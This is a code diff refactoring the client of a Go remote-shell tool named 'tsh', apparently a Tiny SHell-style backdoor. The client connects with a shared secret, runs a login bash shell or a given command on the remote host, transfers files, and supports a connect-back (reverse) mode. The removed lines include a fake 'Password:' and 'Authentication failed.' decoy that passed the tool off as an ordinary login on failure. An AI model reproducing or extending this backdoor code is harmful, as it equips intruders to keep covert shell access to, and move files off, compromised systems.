@@ -1,7 +1,6 @@
 package tsh
 
 import (
-	"flag"
 	"fmt"
 	"io"
 	"os"
@@ -16,54 +15,24 @@ import (
 	"golang.org/x/crypto/ssh/terminal"
 )
 
-func Run() {
-	var secret string
-	var port int
-
-	flagset := flag.NewFlagSet(filepath.Base(os.Args[0]), flag.ExitOnError)
-	flagset.StringVar(&secret, "s", "1234", "secret")
-	flagset.IntVar(&port, "p", 1234, "port")
-	flagset.Usage = func() {
-		fmt.Fprintf(flagset.Output(), "Usage: ./%s [-s secret] [-p port] <action>\n", flagset.Name())
-		fmt.Fprintf(flagset.Output(), "  action:\n")
-		fmt.Fprintf(flagset.Output(), "        <hostname|cb> [command]\n")
-		fmt.Fprintf(flagset.Output(), "        <hostname|cb> get <source-file> <dest-dir>\n")
-		fmt.Fprintf(flagset.Output(), "        <hostname|cb> put <source-file> <dest-dir>\n")
-		flagset.PrintDefaults()
-	}
-	flagset.Parse(os.Args[1:])
-
-	args := flagset.Args()
-	var host, srcfile, dstdir, command string
+func Run(secret string, host string, port int, mode uint8, args []string) {
 	var isConnectBack bool
-	var mode uint8
+	var srcfile, dstdir, command string
 
-	if len(args) == 0 {
-		os.Exit(0)
-	}
-
-	if args[0] == "cb" {
+	if host == "cb" {
 		isConnectBack = true
-	} else {
-		host = args[0]
 	}
-	args = args[1:]
-
 	command = "exec bash --login"
-	switch {
-	case len(args) == 0:
-		mode = constants.RunShell
-	case args[0] == "get" && len(args) == 3:
-		mode = constants.GetFile
-		srcfile = args[1]
-		dstdir = args[2]
-	case args[0] == "put" && len(args) == 3:
-		mode = constants.PutFile
-		srcfile = args[1]
-		dstdir = args[2]
-	default:
-		mode = constants.RunShell
+	if mode == constants.RunShell && len(args) > 0 {
 		command = args[0]
+	}
+	if mode == constants.GetFile && len(args) >= 2 {
+		srcfile = args[0]
+		dstdir = args[1]
+	}
+	if mode == constants.PutFile && len(args) >= 2 {
+		srcfile = args[0]
+		dstdir = args[1]
 	}
 
 	if isConnectBack {
@@ -98,9 +67,8 @@ func Run() {
 		addr := fmt.Sprintf("%s:%d", host, port)
 		layer, err := pel.Dial(addr, secret, false)
 		if err != nil {
-			fmt.Print("Password:")
-			fmt.Scanln()
-			fmt.Println("Authentication failed.")
+			fmt.Fprintf(os.Stderr, "Failed to connect to %s:%d\n", host, port)
+			fmt.Fprintf(os.Stderr, "It is possible that the server is not running or the secret is incorrect.\n")
 			os.Exit(0)
 		}
 		defer layer.Close()
